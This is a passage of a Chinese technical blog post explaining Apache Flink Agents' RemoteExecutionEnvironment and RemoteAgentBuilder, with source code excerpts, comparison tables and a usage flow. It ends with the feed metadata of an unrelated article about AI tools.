    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send_event</span>(<span class="hljs-params">self, event: Event</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Send an event to the context's event queue and log it.

        Parameters
        ----------
        event : Event
            The event to be added to the queue.
        """</span>
        logger.info(<span class="hljs-string">"key: %s, send_event: %s"</span>, self.__key, event)
        self.events.append(event)

    @override
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_resource</span>(<span class="hljs-params">self, name: <span class="hljs-built_in">str</span>, <span class="hljs-built_in">type</span>: ResourceType</span>) -&gt; Resource:
        <span class="hljs-keyword">return</span> self.__agent_plan.get_resource(name, <span class="hljs-built_in">type</span>)

    @<span class="hljs-built_in">property</span>
    @override
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">action_config</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]:
        <span class="hljs-string">"""Get config of the action."""</span>
        <span class="hljs-keyword">return</span> self.__agent_plan.get_action_config(action_name=self.action_name)

    @override
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_action_config_value</span>(<span class="hljs-params">self, key: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">Any</span>:
        <span class="hljs-string">"""Get config option value of the key."""</span>
        <span class="hljs-keyword">return</span> self.__agent_plan.get_action_config_value(
            action_name=self.action_name, key=key
        )

    @<span class="hljs-built_in">property</span>
    @override
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">short_term_memory</span>(<span class="hljs-params">self</span>) -&gt; MemoryObject:
        <span class="hljs-string">"""Get the short-term memory object associated with this context.

        Returns:
        -------
        MemoryObject
            The root object of the short-term memory.
        """</span>
        <span class="hljs-keyword">return</span> self._short_term_memory

    @<span class="hljs-built_in">property</span>
    @override
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">agent_metric_group</span>(<span class="hljs-params">self</span>) -&gt; MetricGroup:
        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Support metric mechanism for local agent execution.</span>
        err_msg = <span class="hljs-string">"Metric mechanism is not supported for local agent execution yet."</span>
        <span class="hljs-keyword">raise</span> NotImplementedError(err_msg)

    @<span class="hljs-built_in">property</span>
    @override
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">action_metric_group</span>(<span class="hljs-params">self</span>) -&gt; MetricGroup:
        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Support metric mechanism for local agent execution.</span>
        err_msg = <span class="hljs-string">"Metric mechanism is not supported for local agent execution yet."</span>
        <span class="hljs-keyword">raise</span> NotImplementedError(err_msg)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">execute_async</span>(<span class="hljs-params">
        self,
        func: <span class="hljs-type">Callable</span>[[<span class="hljs-type">Any</span>], <span class="hljs-type">Any</span>],
        *args: <span class="hljs-type">Tuple</span>[<span class="hljs-type">Any</span>, ...],
        **kwargs: <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>],
    </span>) -&gt; <span class="hljs-type">Any</span>:
        <span class="hljs-string">"""Asynchronously execute the provided function. Access to memory
        is prohibited within the function.
        """</span>
        logger.warning(
            <span class="hljs-string">"Local runner does not support asynchronous execution; falling back to synchronous execution."</span>
        )
        func_result = func(*args, **kwargs)
        <span class="hljs-keyword">yield</span>
        <span class="hljs-keyword">return</span> func_result

    @<span class="hljs-built_in">property</span>
    @override
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">config</span>(<span class="hljs-params">self</span>) -&gt; AgentConfiguration:
        <span class="hljs-keyword">return</span> self._config
</code></pre>
<h3 data-id="heading-22">0x03 RemoteExecutionEnvironment</h3>
<p><code>RemoteExecutionEnvironment</code> 是 Flink Agents 对原生 Flink <code>RemoteEnvironment</code> 的封装（适配 Agent 语义），是 Agent（智能体）与 Flink 集群融合的核心载体，核心目标是让 Agent 能够在 Flink 集群中处理 DataStream 和 Table 类型的流式数据，具体承担以下关键职责：</p>
<ul>
<li><code>RemoteExecutionEnvironment</code> 是 Flink Agents 实现 Agent 远程执行的核心环境组件，封装了远程集群连接、作业提交、资源管理等能力；</li>
<li>核心价值是<strong>屏蔽 Flink 远程执行的底层细节</strong>，让用户聚焦 Agent 逻辑定义，而非集群操作；</li>
<li>关键特性是兼容本地调试与远程执行，同时适配 Agent 特有的状态、事件、资源需求，是 Flink Agents 从 “本地单机” 走向 “分布式集群” 的核心支撑。</li>
<li>桥接 Agent 框架与 Flink 运行时：将 Agent 的执行逻辑嵌入 Flink 的 StreamExecutionEnvironment/StreamTableEnvironment，使 Agent 能利用 Flink 的分布式计算能力处理流式数据；</li>
<li>标准化 Agent 执行流程：提供统一的入口（fromDataStream/fromTable）、处理（apply Agent）、输出（toDataStream/toTable）接口，规范 Agent 在 Flink 中的数据处理链路；</li>
<li>配置管理：加载 Flink 集群中 Agent 的专属配置文件（config.yaml），为 Agent 执行提供环境配置支撑；</li>
<li>执行调度：最终触发 Flink 作业的执行（env.execute ()），完成 Agent 处理逻辑的分布式运行。</li>
</ul>
<h4 data-id="heading-23">3.1 核心特色</h4>









































<table><thead><tr><th>特色维度</th><th>具体说明</th></tr></thead><tbody><tr><td>环境适配性</td><td>专门面向 Flink 集群的<strong>远程执行</strong>场景设计，依赖 Flink 的流执行环境（StreamExecutionEnvironment）和表环境（StreamTableEnvironment），而非本地执行；</td></tr><tr><td>数据类型聚焦</td><td>仅支持 Flink 原生的 DataStream/Table 作为输入输出，明确禁用本地场景的 List 类型（fromList/toList），贴合流式计算场景；</td></tr><tr><td>分层设计</td><td>采用 “环境类（RemoteExecutionEnvironment）+ 构建器类（RemoteAgentBuilder）” 分层模式：环境类管控全局配置和 Flink 环境，构建器类聚焦单个 Agent 的执行链路；</td></tr><tr><td>灵活的 Key 选择</td><td>支持自定义 KeySelector 对输入数据分片，无自定义 Key 时默认使用数据自身作为 Key，适配不同的分布式处理需求；</td></tr><tr><td>配置解耦</td><td>从 Flink 配置目录加载 Agent 专属配置，配置文件与代码解耦，便于集群环境下的配置管理；</td></tr><tr><td>容错与校验</td><td>包含关键流程校验（如调用 toDataStream 前必须先 apply Agent）、空值处理（TableEnvironment 懒加载）、异常封装（配置加载 / Agent 执行异常统一抛出 RuntimeException）；</td></tr><tr><td>表与流互通</td><td>支持 Table 与 DataStream 的双向转换（Table 转 DataStream 作为 Agent 输入、DataStream 转 Table 作为输出），适配 Flink SQL / 流处理双场景；</td></tr><tr><td>资源关联</td><td>为 Agent 绑定运行时资源（resources），保障 Agent 执行所需的资源依赖；</td></tr></tbody></table>
<h4 data-id="heading-24">3.2 与原生 Flink RemoteEnvironment 的对比</h4>



































<table><thead><tr><th>特性</th><th>Flink 原生 RemoteEnvironment</th><th>Flink Agents RemoteExecutionEnvironment</th></tr></thead><tbody><tr><td>核心定位</td><td>通用 Flink Job 的远程执行环境</td><td>Agent 语义专属的远程执行环境</td></tr><tr><td>封装层级</td><td>底层 Flink Job 提交</td><td>上层 Agent/AgentPlan 提交</td></tr><tr><td>核心适配</td><td>无 Agent 语义，仅处理通用 JobGraph</td><td>适配 AgentPlan → JobGraph 编译、Agent 状态管理</td></tr><tr><td>资源管理</td><td>通用 Slot / 资源分配</td><td>按 Agent 实例隔离资源，适配工具 / 动作资源需求</td></tr><tr><td>事件 / 状态处理</td><td>无内置事件语义</td><td>封装 Agent 事件（Event）的跨集群传输、状态序列化</td></tr></tbody></table>
<h4 data-id="heading-25">3.3 如何使用 ActionExecutionOperator</h4>
<p>RemoteExecutionEnvironment 通过 Python 层的 RemoteAgentBuilder.to_datastream() 方法间接使用ActionExecutionOperator，过程为：</p>
<ul>
<li>用户定义了一个Agent并应用到执行环境中</li>
<li>调用 to_datastream() 方法触发实际的操作符创建</li>
<li>通过 JNI 调用 Java 层的 CompileUtils.connectToAgent() 方法</li>
<li>最终在 Flink 作业图中创建并配置 ActionExecutionOperator</li>
</ul>
<p>connectToAgent()中会：</p>
<ul>
<li>接收输入的 Java DATa Stream 对象</li>
<li>接收序列化的 AgentPlan（包含所有动作和资源配置）</li>
<li>创建并连接 ActionExecutionOperator 到数据流处理图中</li>
</ul>

<pre><code class="hljs language-lua" lang="lua">    // ============================ basic ====================================
    /**
     * Connects the given KeyedStream to the Flink Agents agent.
     *
     * &lt;p&gt;This method accepts a keyed DataStream <span class="hljs-keyword">and</span> applies the specified agent plan to it. The
     * source of the <span class="hljs-built_in">input</span> stream determines the data <span class="hljs-built_in">format</span>: Java streams provide Objects, <span class="hljs-keyword">while</span>
     * Python streams use serialized <span class="hljs-built_in">byte</span> arrays.
     *
     * @param keyedInputStream The <span class="hljs-built_in">input</span> keyed DataStream.
     * @param agentPlan The agent plan to be executed.
     * @param inputIsJava A flag indicating whether the <span class="hljs-built_in">input</span> stream originates from Java. - If
     *     <span class="hljs-literal">true</span>, <span class="hljs-built_in">input</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">output</span> types are Java Objects. - If <span class="hljs-literal">false</span>, <span class="hljs-built_in">input</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">output</span> types are
     *     <span class="hljs-built_in">byte</span>[].
     * @param &lt;K&gt; The <span class="hljs-built_in">type</span> of the key used <span class="hljs-keyword">in</span> the keyed DataStream.
     * @param &lt;IN&gt; The <span class="hljs-built_in">type</span> of the <span class="hljs-built_in">input</span> data (Object <span class="hljs-keyword">or</span> <span class="hljs-built_in">byte</span>[]).
     * @param &lt;OUT&gt; The <span class="hljs-built_in">type</span> of the <span class="hljs-built_in">output</span> data (Object <span class="hljs-keyword">or</span> <span class="hljs-built_in">byte</span>[]).
     * @<span class="hljs-keyword">return</span> The processed DataStream as the result of the agent.
     */
    private static &lt;K, IN, OUT&gt; DataStream&lt;OUT&gt; connectToAgent(
            KeyedStream&lt;IN, K&gt; keyedInputStream,
            AgentPlan agentPlan,
            TypeInformation&lt;OUT&gt; outTypeInformation,
            boolean inputIsJava) {
        <span class="hljs-keyword">return</span> (DataStream&lt;OUT&gt;)
                keyedInputStream
                        .transform(
                                <span class="hljs-string">"action-execute-operator"</span>,
                                outTypeInformation,
                                new ActionExecutionOperatorFactory(agentPlan, inputIsJava))
                        .setParallelism(keyedInputStream.getParallelism());
    }
</code></pre>
<h4 data-id="heading-26">3.4 典型流程</h4>
<p>当用户编写基于 RemoteExecutionEnvironment 的应用程序时，典型流程如下：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 获取Flink执行环境</span>
<span class="hljs-attr">env</span> = StreamExecutionEnvironment.get_execution_environment()
<span class="hljs-comment"># 创建 Agent 执行环境</span>
<span class="hljs-attr">agent_env</span> = AgentsExecutionEnvironment.get_execution_environment(env)
<span class="hljs-comment"># 添加所需资源</span>
agent_env.add_resource(...)
<span class="hljs-comment"># 设置输入数据流到Agent</span>
<span class="hljs-attr">input_stream</span> = agent_env.from_Collection(input_data) 
<span class="hljs-attr">builder</span> = agent_env.from_datastream(input_stream)
<span class="hljs-comment"># 应用代理逻辑</span>
<span class="hljs-attr">agent</span> = MyCustomAgent()
builder.apply(agent) 
<span class="hljs-comment"># 执行代理</span>
<span class="hljs-attr">output_stream</span> = builder.to_datastream()
env.execute()
</code></pre>
<h4 data-id="heading-27">3.5 交互逻辑</h4>
<p>RemoteExecutionEnvironment、ActionExecutionOperator 和 ActionTask 之间的交互逻辑如下。</p>
<p>这三个组件在 Flink Agents 框架中扮演不同的角色，协同工作来执行 Agent 逻辑：</p>
<ul>
<li><strong>RemoteExecutionEnvironment</strong>：提供远程执行环境，负责构建和连接 Agent 到 Flink 数据流</li>
<li><strong>ActionExecutionOperator</strong>：Flink 流处理操作符，实际执行 Agent 的动作逻辑</li>
<li><strong>ActionTask</strong>：表示单个动作执行任务的抽象概念</li>
</ul>
<p><strong>交互流程图解</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c78c2ac7b5654f51b4726e8bcea4434a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769090658&amp;x-signature=fAf8DK%2FKfvw7QRpfuBz4J9QiezI%3D" alt="Flink-7-1" loading="lazy"/></p>
<p>Flink-7-1</p>
<p>详细交互流程如下：</p>
<ol>
<li>初始化阶段</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2696b3427a48428aa1d26b983d56a307~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769090658&amp;x-signature=%2FtBgEcaGOMhj3I%2B5FvyC5olC%2FYQ%3D" alt="Flink-7-2" loading="lazy"/></p>
<p>Flink-7-2</p>
<ol start="2">
<li>运行时事件处理流程</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb379157ba8f46afb4087536e02dc3f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769090658&amp;x-signature=7FBNryBv%2BjsSTs7uY3tP%2BcXwELg%3D" alt="Flink-7-3" loading="lazy"/></p>
<p>Flink-7-3</p>
<h4 data-id="heading-28">3.6 实现</h4>
<p>RemoteAgentBuilder 的代码如下</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteAgentBuilder</span>(<span class="hljs-title class_ inherited__">AgentBuilder</span>):
    <span class="hljs-string">"""RemoteAgentBuilder for integrating datastream/table and agent."""</span>

    __<span class="hljs-built_in">input</span>: DataStream
    __agent_plan: AgentPlan = <span class="hljs-literal">None</span>
    __output: DataStream = <span class="hljs-literal">None</span>
    __t_env: StreamTableEnvironment
    __config: AgentConfiguration
    __resources: <span class="hljs-type">Dict</span>[ResourceType, <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]] = <span class="hljs-literal">None</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">
        self,
        <span class="hljs-built_in">input</span>: DataStream,
        config: AgentConfiguration,
        t_env: StreamTableEnvironment | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        resources: <span class="hljs-type">Dict</span>[ResourceType, <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Init method of RemoteAgentBuilder."""</span>
        self.__<span class="hljs-built_in">input</span> = <span class="hljs-built_in">input</span>
        self.__t_env = t_env
        self.__config = config
        self.__resources = resources

    @<span class="hljs-built_in">property</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">t_env</span>(<span class="hljs-params">self</span>) -&gt; StreamTableEnvironment:
        <span class="hljs-string">"""Get or crate table environment."""</span>
        <span class="hljs-keyword">if</span> self.__t_env <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            self.__t_env = StreamTableEnvironment.create(
                stream_execution_environment=self.__env
            )
        <span class="hljs-keyword">return</span> self.__t_env

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">apply</span>(<span class="hljs-params">self, agent: Agent</span>) -&gt; <span class="hljs-string">"AgentBuilder"</span>:
        <span class="hljs-string">"""Set agent of execution environment.

        Parameters
        ----------
        agent : Agent
            The agent user defined to run in execution environment.
        """</span>
        <span class="hljs-keyword">if</span> self.__agent_plan <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
            err_msg = <span class="hljs-string">"RemoteAgentBuilder doesn't support apply multiple agents yet."</span>
            <span class="hljs-keyword">raise</span> RuntimeError(err_msg)

        <span class="hljs-comment"># inspect refer actions and resources from env to agent.</span>
        <span class="hljs-keyword">for</span> <span class="hljs-built_in">type</span>, name_to_resource <span class="hljs-keyword">in</span> self.__resources.items():
            agent.resources[<span class="hljs-built_in">type</span>] = name_to_resource | agent.resources[<span class="hljs-built_in">type</span>]

        self.__agent_plan = AgentPlan.from_agent(agent, self.__config)

        <span class="hljs-keyword">return</span> self

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">to_datastream</span>(<span class="hljs-params">self, output_type: TypeInformation | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span></span>) -&gt; DataStream:
        <span class="hljs-string">"""Get output datastream of agent execution.

        Returns:
        -------
        DataStream
            Output datastream of agent execution.
        """</span>
        <span class="hljs-keyword">if</span> self.__agent_plan <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            err_msg = <span class="hljs-string">"Must apply agent before call to_datastream/to_table."</span>
            <span class="hljs-keyword">raise</span> RuntimeError(err_msg)

        <span class="hljs-comment"># return the same output datastream when call to_datastream multiple.</span>
        <span class="hljs-keyword">if</span> self.__output <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            j_data_stream_output = invoke_method(
                <span class="hljs-literal">None</span>,
                <span class="hljs-string">"org.apache.flink.agents.runtime.CompileUtils"</span>,
                <span class="hljs-string">"connectToAgent"</span>,
                [
                    self.__<span class="hljs-built_in">input</span>._j_data_stream,
                    self.__agent_plan.model_dump_json(serialize_as_any=<span class="hljs-literal">True</span>),
                ],
                [
                    <span class="hljs-string">"org.apache.flink.streaming.api.datastream.KeyedStream"</span>,
                    <span class="hljs-string">"java.lang.String"</span>,
                ],
            )
            output_stream = DataStream(j_data_stream_output)
            self.__output = output_stream.<span class="hljs-built_in">map</span>(
                <span class="hljs-keyword">lambda</span> x: cloudpickle.loads(x), output_type=output_type
            )
        <span class="hljs-keyword">return</span> self.__output

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">to_table</span>(<span class="hljs-params">self, schema: Schema, output_type: TypeInformation</span>) -&gt; Table:
        <span class="hljs-string">"""Get output Table of agent execution.

        Parameters
        ----------
        schema : Schema
            Indicate schema of the output table.
        output_type : TypeInformation
            Indicate schema corresponding type information.

        Returns:
        -------
        Table
            Output Table of agent execution.
        """</span>
        <span class="hljs-keyword">return</span> self.t_env.from_data_stream(self.to_datastream(output_type), schema)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">to_list</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]]:
        <span class="hljs-string">"""Get output list of agent execution.

        This method is not supported for remote execution environments.
        """</span>
        msg = <span class="hljs-string">"RemoteAgentBuilder does not support to_list."</span>
        <span class="hljs-keyword">raise</span> NotImplementedError(msg)
</code></pre>
<p>RemoteExecutionEnvironment 的代码如下。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteExecutionEnvironment</span>(<span class="hljs-title class_ inherited__">AgentsExecutionEnvironment</span>):
    <span class="hljs-string">"""Implementation of AgentsExecutionEnvironment for execution with DataStream."""</span>

    __env: StreamExecutionEnvironment
    __t_env: StreamTableEnvironment
    __config: AgentConfiguration

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">
        self,
        env: StreamExecutionEnvironment,
        t_env: StreamTableEnvironment | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Init method of RemoteExecutionEnvironment."""</span>
        <span class="hljs-built_in">super</span>().__init__()
        self.__env = env
        self.__t_env = t_env
        self.__config = AgentConfiguration()
        self.__load_config_from_flink_conf_dir()

    @<span class="hljs-built_in">property</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">t_env</span>(<span class="hljs-params">self</span>) -&gt; StreamTableEnvironment:
        <span class="hljs-string">"""Get or crate table environment."""</span>
        <span class="hljs-keyword">if</span> self.__t_env <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            self.__t_env = StreamTableEnvironment.create(
                stream_execution_environment=self.__env
            )
        <span class="hljs-keyword">return</span> self.__t_env

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_config</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span></span>) -&gt; AgentConfiguration:
        <span class="hljs-string">"""Get the writable configuration for flink agents.

        Returns:
        -------
        LocalConfiguration
            The configuration for flink agents.
        """</span>
        <span class="hljs-keyword">return</span> self.__config

    @<span class="hljs-built_in">staticmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__process_input_datastream</span>(<span class="hljs-params">
        <span class="hljs-built_in">input</span>: DataStream, key_selector: KeySelector | <span class="hljs-type">Callable</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>
    </span>) -&gt; KeyedStream:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">input</span>, KeyedStream):
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">input</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">if</span> key_selector <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
                msg = <span class="hljs-string">"KeySelector must be provided."</span>
                <span class="hljs-keyword">raise</span> RuntimeError(msg)
            <span class="hljs-built_in">input</span> = <span class="hljs-built_in">input</span>.key_by(key_selector)
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">input</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">from_datastream</span>(<span class="hljs-params">
        self, <span class="hljs-built_in">input</span>: DataStream, key_selector: KeySelector | <span class="hljs-type">Callable</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>
    </span>) -&gt; RemoteAgentBuilder:
        <span class="hljs-string">"""Set input datastream of agent.

        Parameters
        ----------
        input : DataStream
            Receive a DataStream as input.
        key_selector : KeySelector
            Extract key from each input record, must not be None when input is
            not KeyedStream.
        """</span>
        <span class="hljs-built_in">input</span> = self.__process_input_datastream(<span class="hljs-built_in">input</span>, key_selector)

        <span class="hljs-keyword">return</span> RemoteAgentBuilder(
            <span class="hljs-built_in">input</span>=<span class="hljs-built_in">input</span>,
            config=self.__config,
            t_env=self.__t_env,
            resources=self.resources,
        )

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">from_table</span>(<span class="hljs-params">
        self,
        <span class="hljs-built_in">input</span>: Table,
        key_selector: KeySelector | <span class="hljs-type">Callable</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; AgentBuilder:
        <span class="hljs-string">"""Set input Table of agent.

        Parameters
        ----------
        input : Table
            Receive a Table as input.
        key_selector : KeySelector
            Extract key from each input record.
        """</span>
        <span class="hljs-built_in">input</span> = self.t_env.to_data_stream(table=<span class="hljs-built_in">input</span>)

        <span class="hljs-built_in">input</span> = <span class="hljs-built_in">input</span>.<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: x, output_type=PickledBytesTypeInfo())

        <span class="hljs-built_in">input</span> = self.__process_input_datastream(<span class="hljs-built_in">input</span>, key_selector)
        <span class="hljs-keyword">return</span> RemoteAgentBuilder(
            <span class="hljs-built_in">input</span>=<span class="hljs-built_in">input</span>,
            config=self.__config,
            t_env=self.t_env,
            resources=self.resources,
        )

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">from_list</span>(<span class="hljs-params">self, <span class="hljs-built_in">input</span>: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]]</span>) -&gt; <span class="hljs-string">"AgentsExecutionEnvironment"</span>:
        <span class="hljs-string">"""Set input list of agent execution.

        This method is not supported for remote execution environments.
        """</span>
        msg = <span class="hljs-string">"RemoteExecutionEnvironment does not support from_list."</span>
        <span class="hljs-keyword">raise</span> NotImplementedError(msg)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Execute agent."""</span>
        self.__env.execute()


    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__load_config_from_flink_conf_dir</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Load agent configuration from FLINK_CONF_DIR if available."""</span>
        flink_conf_dir = os.environ.get(<span class="hljs-string">"FLINK_CONF_DIR"</span>)
        <span class="hljs-keyword">if</span> flink_conf_dir <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span>

        <span class="hljs-comment"># Try to find config file, with fallback to legacy name</span>
        config_path = self.__find_config_file(flink_conf_dir)

        <span class="hljs-keyword">if</span> config_path <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            logging.error(<span class="hljs-string">f"Config file not found in <span class="hljs-subst">{flink_conf_dir}</span>"</span>)
        <span class="hljs-keyword">else</span>:
            self.__config.load_from_file(<span class="hljs-built_in">str</span>(config_path))

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__find_config_file</span>(<span class="hljs-params">self, flink_conf_dir: <span class="hljs-built_in">str</span></span>) -&gt; Path | <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Find config file in the given directory, checking both new and legacy names.

        Parameters
        ----------
        flink_conf_dir : str
            Directory to search for config files.

        Returns:
        -------
        Path | None
            Path to the config file if found, None otherwise.
        """</span>
        <span class="hljs-comment"># Try legacy config file name first</span>
        legacy_config_path = Path(flink_conf_dir).joinpath(_LEGACY_CONFIG_FILE_NAME)
        <span class="hljs-keyword">if</span> legacy_config_path.exists():
            logging.warning(
                <span class="hljs-string">f"Using legacy config file <span class="hljs-subst">{_LEGACY_CONFIG_FILE_NAME}</span>"</span>
            )
            <span class="hljs-keyword">return</span> legacy_config_path

        <span class="hljs-comment"># Try new config file name as fallback</span>
        primary_config_path = Path(flink_conf_dir).joinpath(_CONFIG_FILE_NAME)
        <span class="hljs-keyword">if</span> primary_config_path.exists():
            <span class="hljs-keyword">return</span> primary_config_path

        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
</code></pre>
<h3 data-id="heading-29">0xFF 参考</h3>
<p>本文使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmarkdown.com.cn" target="_blank" title="https://markdown.com.cn" ref="nofollow noopener noreferrer">markdown.com.cn</a> 排版</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[建议收藏 | 2026年AI工具封神榜：从Sora到混元3D，生产力彻底爆发]]></title>    <link>https://juejin.cn/post/7595393113553698831</link>    <guid>https://juejin.cn/post/7595393113553698831</guid>    <pubDate>2026-01-15T14:51:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595393113553698831" data-draft-id="7595410455223058442" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="建议收藏 | 2026年AI工具封神榜：从Sora到混元3D，生产力彻底爆发"/> <meta itemprop="keywords" content="前端,后端,人工智能"/> <meta itemprop="datePublished" content="2026-01-15T14:51:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="柳杉"/> <meta itemprop="url" content="https://juejin.cn/user/4441682708274279"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            建议收藏 | 2026年AI工具封神榜：从Sora到混元3D，生产力彻底爆发
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4441682708274279/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    柳杉
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T14:51:58.000Z" title="Thu Jan 15 2026 14:51:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
